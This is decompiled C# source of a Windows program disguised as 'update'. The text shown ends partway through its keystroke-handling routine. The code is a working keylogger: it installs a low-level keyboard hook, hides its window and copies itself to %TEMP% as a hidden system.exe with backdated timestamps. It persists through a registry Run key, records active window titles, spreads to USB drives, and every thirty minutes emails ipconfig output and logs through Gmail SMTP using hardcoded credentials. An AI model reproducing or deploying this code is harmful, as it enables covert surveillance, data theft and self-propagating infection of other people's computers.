using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using update.My;

namespace update;

[DesignerGenerated]
public class Form1 : Form
{
	public class KeyboardHook
	{
		private struct KBDLLHOOKSTRUCT
		{
			public int vkCode;

			public int scancode;

			public int flags;
		}

		private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

		public delegate void KeyDownEventHandler(Keys Key);

		public delegate void KeyUpEventHandler(Keys Key);

		private const int HC_ACTION = 0;

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private const int WM_KEYUP = 257;

		private const int WM_SYSKEYDOWN = 260;

		private const int WM_SYSKEYUP = 261;

		private static KeyDownEventHandler KeyDownEvent;

		private static KeyUpEventHandler KeyUpEvent;

		private static int KeyHook;

		private static KeyboardProcDelegate KeyHookDelegate;

		public static event KeyDownEventHandler KeyDown
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
			}
		}

		public static event KeyUpEventHandler KeyUp
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		public KeyboardHook()
		{
			KeyHookDelegate = KeyboardProc;
			KeyHook = SetWindowsHookExA(13, KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		private static int KeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
					KeyDownEvent?.Invoke((Keys)lParam.vkCode);
					break;
				case 257:
				case 261:
					KeyUpEvent?.Invoke((Keys)lParam.vkCode);
					break;
				}
			}
			return CallNextHookEx(KeyHook, nCode, wParam, lParam);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(KeyHook);
			base.Finalize();
		}
	}

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	private int result;

	[AccessedThroughProperty("kbHook")]
	private KeyboardHook _kbHook;

	private string strin;

	private int sent;

	private AttachmentCollection attl;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	private virtual KeyboardHook kbHook
	{
		[DebuggerNonUserCode]
		get
		{
			return _kbHook;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			KeyboardHook.KeyDownEventHandler value2 = shiftandcaps;
			if (_kbHook != null)
			{
				KeyboardHook.KeyDown -= value2;
			}
			_kbHook = value;
			if (_kbHook != null)
			{
				KeyboardHook.KeyDown += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		kbHook = new KeyboardHook();
		strin = null;
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Form1);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		Timer3 = new Timer(components);
		TextBox3 = new TextBox();
		((Control)this).SuspendLayout();
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1800000);
		Timer2.set_Enabled(true);
		Timer2.set_Interval(3333);
		TextBox textBox = TextBox1;
		Point location = new Point(133, 22);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox textBox3 = TextBox2;
		location = new Point(12, 131);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(100, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		Timer3.set_Enabled(true);
		Timer3.set_Interval(10000);
		TextBox textBox5 = TextBox3;
		location = new Point(160, 112);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(100, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(2);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vKey);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", true);
			Directory.SetCreationTimeUtc(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", DateTime.FromOADate(0.0011602850986242334));
			Directory.SetLastAccessTimeUtc(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", DateTime.FromOADate(0.0011602850986242334));
			Directory.SetLastWriteTimeUtc(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", DateTime.FromOADate(0.0011602850986242334));
			FileSystem.SetAttr(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", (FileAttribute)2);
		}
		if (Operators.ConditionalCompareObjectEqual(((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().GetValue("sys.update"), (object)false, false))
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "sys.update", (object)(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData() + "\\system.exe"), RegistryValueKind.String);
		}
		Timer1.Start();
		Timer2.Start();
		Timer3.Start();
		UsbInfect();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					if (((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						MailMessage mailMessage = new MailMessage("logedlog@gmail.com", "yibab345@gmail.com");
						SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
						smtpClient.EnableSsl = true;
						smtpClient.Port = 587;
						smtpClient.Credentials = new NetworkCredential("logedlog", "done123456789");
						mailMessage.IsBodyHtml = true;
						mailMessage.Body = "<h1>Don't Lose Hope!!<h1>";
						mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name();
						Interaction.Shell("cmd /c ipconfig > c:\\systems.txt", (AppWinStyle)2, false, -1);
						Attachment item = new Attachment("c:\\systems.txt");
						attl.Add(item);
						Attachment item2 = new Attachment(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.txt");
						attl.Add(item2);
						IEnumerator<Attachment> enumerator = attl.GetEnumerator();
						while (enumerator.MoveNext())
						{
							Attachment current = enumerator.Current;
							mailMessage.Attachments.Add(current);
						}
						enumerator?.Dispose();
						smtpClient.Send(mailMessage);
						sent = 1;
					}
					else
					{
						sent = 0;
					}
					break;
				case 295:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_0161;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 295;
				continue;
			}
			break;
			IL_0161:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(strin, GetActiveWindowTitle(), false) != 0)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\r\n[" + GetActiveWindowTitle() + "]:\r\n");
			strin = GetActiveWindowTitle();
		}
		UsbInfect();
	}

	public void shiftandcaps(Keys Key)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Invalid comparison between Unknown and I4
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Invalid comparison between Unknown and I4
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Invalid comparison between Unknown and I4
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Invalid comparison between Unknown and I4
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Invalid comparison between Unknown and I4
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Invalid comparison between Unknown and I4
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Invalid comparison between Unknown and I4
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Invalid comparison between Unknown and I4
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Invalid comparison between Unknown and I4
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Invalid comparison between Unknown and I4
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0279: Invalid comparison between Unknown and I4
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Invalid comparison between Unknown and I4
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Invalid comparison between Unknown and I4
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Invalid comparison between Unknown and I4
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Invalid comparison between Unknown and I4
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Invalid comparison between Unknown and I4
		//IL_0372: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Invalid comparison between Unknown and I4
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Invalid comparison between Unknown and I4
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Invalid comparison between Unknown and I4
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Invalid comparison between Unknown and I4
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Invalid comparison between Unknown and I4
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Invalid comparison between Unknown and I4
		//IL_046e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0471: Invalid comparison between Unknown and I4
		//IL_0498: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Invalid comparison between Unknown and I4
		//IL_04c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Invalid comparison between Unknown and I4
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ef: Invalid comparison between Unknown and I4
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Invalid comparison between Unknown and I4
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Invalid comparison between Unknown and I4
		//IL_056a: Unknown result type (might be due to invalid IL or missing references)
		//IL_056d: Invalid comparison between Unknown and I4
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_0597: Invalid comparison between Unknown and I4
		//IL_05be: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c1: Invalid comparison between Unknown and I4
		//IL_05e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Invalid comparison between Unknown and I4
		//IL_0612: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Invalid comparison between Unknown and I4
		//IL_063c: Unknown result type (might be due to invalid IL or missing references)
		//IL_063f: Invalid comparison between Unknown and I4
		//IL_0666: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Invalid comparison between Unknown and I4
		//IL_0690: Unknown result type (might be due to invalid IL or missing references)
		//IL_0693: Invalid comparison between Unknown and I4
		//IL_06ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bd: Invalid comparison between Unknown and I4
		//IL_06e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e7: Invalid comparison between Unknown and I4
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0711: Invalid comparison between Unknown and I4
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_073b: Invalid comparison between Unknown and I4
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Invalid comparison between Unknown and I4
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_078f: Invalid comparison between Unknown and I4
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bc: Invalid comparison between Unknown and I4
		//IL_07e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Invalid comparison between Unknown and I4
		//IL_0810: Unknown result type (might be due to invalid IL or missing references)
		//IL_0816: Invalid comparison between Unknown and I4
		//IL_083d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0843: Invalid comparison between Unknown and I4
		//IL_086a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Invalid comparison between Unknown and I4
		//IL_0897: Unknown result type (might be due to invalid IL or missing references)
		//IL_089d: Invalid comparison between Unknown and I4
		//IL_08c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ca: Invalid comparison between Unknown and I4
		//IL_08f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f7: Invalid comparison between Unknown and I4
		//IL_091e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0924: Invalid comparison between Unknown and I4
		//IL_094b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0951: Invalid comparison between Unknown and I4
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_097b: Invalid comparison between Unknown and I4
		//IL_09a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a5: Invalid comparison between Unknown and I4
		//IL_09cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cf: Invalid comparison between Unknown and I4
		//IL_09f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f9: Invalid comparison between Unknown and I4
		//IL_0a20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a23: Invalid comparison between Unknown and I4
		//IL_0a4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4d: Invalid comparison between Unknown and I4
		//IL_0a74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a77: Invalid comparison between Unknown and I4
		//IL_0a9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa1: Invalid comparison between Unknown and I4
		//IL_0ac8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acb: Invalid comparison between Unknown and I4
		//IL_0af2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af5: Invalid comparison between Unknown and I4
		//IL_0b1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1f: Invalid comparison between Unknown and I4
		//IL_0b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b49: Invalid comparison between Unknown and I4
		//IL_0b70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b73: Invalid comparison between Unknown and I4
		//IL_0b9a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9d: Invalid comparison between Unknown and I4
		//IL_0bc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc7: Invalid comparison between Unknown and I4
		//IL_0bfc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bfe: Invalid comparison between Unknown and I4
		//IL_0c33: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c36: Invalid comparison between Unknown and I4
		//IL_0c5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c60: Invalid comparison between Unknown and I4
		//IL_0c87: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c8a: Invalid comparison between Unknown and I4
		//IL_0cb1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb4: Invalid comparison between Unknown and I4
		//IL_0cdb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cde: Invalid comparison between Unknown and I4
		//IL_0d05: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d08: Invalid comparison between Unknown and I4
		//IL_0d2f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d32: Invalid comparison between Unknown and I4
		//IL_0d59: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d5c: Invalid comparison between Unknown and I4
		//IL_0d83: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d86: Invalid comparison between Unknown and I4
		//IL_0dad: Unknown result type (might be due to invalid IL or missing references)
		//IL_0db0: Invalid comparison between Unknown and I4
		//IL_0dd7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dda: Invalid comparison between Unknown and I4
		//IL_0e01: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e04: Invalid comparison between Unknown and I4
		//IL_0e55: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e58: Invalid comparison between Unknown and I4
		//IL_0e7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e82: Invalid comparison between Unknown and I4
		//IL_0ea9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eac: Invalid comparison between Unknown and I4
		//IL_0ed3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed6: Invalid comparison between Unknown and I4
		//IL_0efd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f00: Invalid comparison between Unknown and I4
		//IL_0f27: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f2a: Invalid comparison between Unknown and I4
		//IL_0f51: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f54: Invalid comparison between Unknown and I4
		//IL_0f7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7e: Invalid comparison between Unknown and I4
		//IL_0fa5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fa8: Invalid comparison between Unknown and I4
		//IL_0fcf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd2: Invalid comparison between Unknown and I4
		//IL_0ff9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ffc: Invalid comparison between Unknown and I4
		//IL_1023: Unknown result type (might be due to invalid IL or missing references)
		//IL_1026: Invalid comparison between Unknown and I4
		//IL_104d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1050: Invalid comparison between Unknown and I4
		//IL_1077: Unknown result type (might be due to invalid IL or missing references)
		//IL_107a: Invalid comparison between Unknown and I4
		//IL_10a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a4: Invalid comparison between Unknown and I4
		//IL_10cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ce: Invalid comparison between Unknown and I4
		//IL_10f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_10f8: Invalid comparison between Unknown and I4
		//IL_111f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1122: Invalid comparison between Unknown and I4
		//IL_1149: Unknown result type (might be due to invalid IL or missing references)
		//IL_114c: Invalid comparison between Unknown and I4
		//IL_1173: Unknown result type (might be due to invalid IL or missing references)
		//IL_1176: Invalid comparison between Unknown and I4
		//IL_119d: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a0: Invalid comparison between Unknown and I4
		//IL_11c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ca: Invalid comparison between Unknown and I4
		//IL_11f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_11f4: Invalid comparison between Unknown and I4
		//IL_121b: Unknown result type (might be due to invalid IL or missing references)
		//IL_121e: Invalid comparison between Unknown and I4
		//IL_1245: Unknown result type (might be due to invalid IL or missing references)
		//IL_1248: Invalid comparison between Unknown and I4
		//IL_126f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1272: Invalid comparison between Unknown and I4
		//IL_1299: Unknown result type (might be due to invalid IL or missing references)
		//IL_129c: Invalid comparison between Unknown and I4
		//IL_12c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_12c6: Invalid comparison between Unknown and I4
		//IL_12ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f0: Invalid comparison between Unknown and I4
		//IL_1317: Unknown result type (might be due to invalid IL or missing references)
		//IL_131a: Invalid comparison between Unknown and I4
		//IL_1341: Unknown result type (might be due to invalid IL or missing references)
		//IL_1344: Invalid comparison between Unknown and I4
		//IL_136b: Unknown result type (might be due to invalid IL or missing references)
		//IL_136e: Invalid comparison between Unknown and I4
		//IL_1395: Unknown result type (might be due to invalid IL or missing references)
		//IL_1398: Invalid comparison between Unknown and I4
		//IL_13bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_13c2: Invalid comparison between Unknown and I4
		//IL_13e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_13ec: Invalid comparison between Unknown and I4
		//IL_1413: Unknown result type (might be due to invalid IL or missing references)
		//IL_1416: Invalid comparison between Unknown and I4
		//IL_143d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1440: Invalid comparison between Unknown and I4
		//IL_1467: Unknown result type (might be due to invalid IL or missing references)
		//IL_146a: Invalid comparison between Unknown and I4
		//IL_1491: Unknown result type (might be due to invalid IL or missing references)
		//IL_1494: Invalid comparison between Unknown and I4
		//IL_14bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_14be: Invalid comparison between Unknown and I4
		//IL_14e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_14e8: Invalid comparison between Unknown and I4
		//IL_150f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1512: Invalid comparison between Unknown and I4
		//IL_1539: Unknown result type (might be due to invalid IL or missing references)
		//IL_153c: Invalid comparison between Unknown and I4
		//IL_1563: Unknown result type (might be due to invalid IL or missing references)
		//IL_1566: Invalid comparison between Unknown and I4
		//IL_158d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1590: Invalid comparison between Unknown and I4
		//IL_15b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_15ba: Invalid comparison between Unknown and I4
		//IL_15e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_15e7: Invalid comparison between Unknown and I4
		//IL_160e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1614: Invalid comparison between Unknown and I4
		//IL_163b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1641: Invalid comparison between Unknown and I4
		//IL_1668: Unknown result type (might be due to invalid IL or missing references)
		//IL_166e: Invalid comparison between Unknown and I4
		//IL_1695: Unknown result type (might be due to invalid IL or missing references)
		//IL_169b: Invalid comparison between Unknown and I4
		//IL_16c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_16c8: Invalid comparison between Unknown and I4
		//IL_16ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_16f5: Invalid comparison between Unknown and I4
		//IL_171c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1722: Invalid comparison between Unknown and I4
		//IL_1749: Unknown result type (might be due to invalid IL or missing references)
		//IL_174f: Invalid comparison between Unknown and I4
		//IL_1776: Unknown result type (might be due to invalid IL or missing references)
		//IL_177c: Invalid comparison between Unknown and I4
		//IL_17a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_17a6: Invalid comparison between Unknown and I4
		//IL_17cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_17d0: Invalid comparison between Unknown and I4
		//IL_17f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_17fa: Invalid comparison between Unknown and I4
		//IL_1821: Unknown result type (might be due to invalid IL or missing references)
		//IL_1824: Invalid comparison between Unknown and I4
